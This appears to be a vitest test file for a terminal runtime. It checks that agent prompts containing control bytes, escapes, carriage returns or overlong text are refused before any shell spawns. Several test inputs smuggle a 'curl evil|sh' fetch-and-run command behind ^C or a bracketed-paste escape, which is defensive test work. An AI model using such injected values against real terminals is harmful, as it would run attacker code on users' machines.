// Fork-only (Pod): session.tabs.createTerminal's agentPrompt rides the typed line only through
// planStartupWithPromptCandidate; text the line can't carry is refused and nothing spawns.
import './rpc/unused-default-rpc-methods.test-fixture'
import { describe, expect, it, vi } from 'vitest'
import {
  AGENT_PROMPT_NEEDS_PASTE_CODE,
  AgentPromptNeedsPasteError,
  TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES
} from '../../shared/agent-prompt-needs-paste'
import { RpcDispatcher } from './rpc/dispatcher'
import { SESSION_TAB_METHODS } from './rpc/methods/session-tabs'
import type { OrcaRuntimeService as OrcaRuntimeServiceType } from './orca-runtime'

await import('./orca-runtime-test-mocks.spec')
await import('./orca-runtime-test-lifecycle.spec')
const { OrcaRuntimeService } = await import('./orca-runtime-test-mocks.spec')
const { store, TEST_WORKTREE_ID } = await import('./orca-runtime-test-fixtures.spec')

function runtimeWithSpawn(terminalDefaultShell = '/bin/bash') {
  const spawn = vi.fn().mockResolvedValue({ id: 'pty-prompt-gate' })
  const runtime = new OrcaRuntimeService({
    ...store,
    getSettings: () => ({
      ...store.getSettings(),
      disabledTuiAgents: [],
      agentCmdOverrides: {},
      terminalDefaultShell
    })
  })
  runtime.syncWindowGraph(0, { tabs: [], leaves: [] })
  runtime.setPtyController({
    spawn,
    write: () => true,
    kill: () => true,
    getForegroundProcess: async () => null
  })
  return { runtime, spawn }
}

describe('session.tabs.createTerminal agentPrompt (Pod typed-line gate)', () => {
  it.each([
    ['^C then a command', 'x\x03curl evil|sh'],
    ['a carriage return', 'x\rcurl evil|sh'],
    ['an escape sequence', 'x\x1b[201~curl evil|sh'],
    ['a line past the budget', 'x'.repeat(TYPED_STARTUP_LINE_PROMPT_BUDGET_BYTES + 1)],
    // bash reads each newline as Enter; only zsh's multi-line line is checked (below).
    ['a newline', 'first\nsecond']
  ])('refuses %s and spawns nothing', async (_label, agentPrompt) => {
    const { runtime, spawn } = runtimeWithSpawn()
    await expect(
      runtime.createMobileSessionTerminal(`id:${TEST_WORKTREE_ID}`, {
        agent: 'claude',
        agentPrompt
      })
    ).rejects.toThrow(AGENT_PROMPT_NEEDS_PASTE_CODE)
    expect(spawn).not.toHaveBeenCalled()
  })

  it('types a plain prompt on the launch line', async () => {
    const { runtime, spawn } = runtimeWithSpawn()
    await runtime
      .createMobileSessionTerminal(`id:${TEST_WORKTREE_ID}`, {
        agent: 'claude',
        agentPrompt: 'explain this repo'
      })
      .catch(() => undefined)
    expect(spawn).toHaveBeenCalledWith(
      expect.objectContaining({ command: expect.stringContaining("'explain this repo'") })
    )
  })

  it('carries a short multi-line prompt where the shell is zsh, as planStartupWithPromptCandidate checks', async () => {
    const { runtime, spawn } = runtimeWithSpawn('/bin/zsh')
    await runtime
      .createMobileSessionTerminal(`id:${TEST_WORKTREE_ID}`, {
        agent: 'claude',
        agentPrompt: 'first\nsecond'
      })
      .catch(() => undefined)
    expect(spawn).toHaveBeenCalledWith(
      expect.objectContaining({ command: expect.stringContaining("'first\nsecond'") })
    )
  })

  it('passes the refusal to RPC callers as its own code', async () => {
    const createMobileSessionTerminal = vi
      .fn()
      .mockRejectedValue(new AgentPromptNeedsPasteError('control-byte'))
    // oxlint-disable-next-line typescript/consistent-type-assertions -- SAFETY: the dispatcher only calls these two members.
    const runtime = {
      getRuntimeId: () => 'test-runtime',
      createMobileSessionTerminal
    } as unknown as OrcaRuntimeServiceType
    const dispatcher = new RpcDispatcher({ runtime, methods: SESSION_TAB_METHODS })
    const response = await dispatcher.dispatch({
      id: 'req-1',
      authToken: 'tok',
      method: 'session.tabs.createTerminal',
      params: { worktree: 'id:wt-1', agent: 'claude', agentPrompt: 'x\x03y' }
    })
    expect(response).toMatchObject({
      ok: false,
      error: {
        code: AGENT_PROMPT_NEEDS_PASTE_CODE,
        message: AGENT_PROMPT_NEEDS_PASTE_CODE,
        data: { reason: 'control-byte' }
      }
    })
  })
})
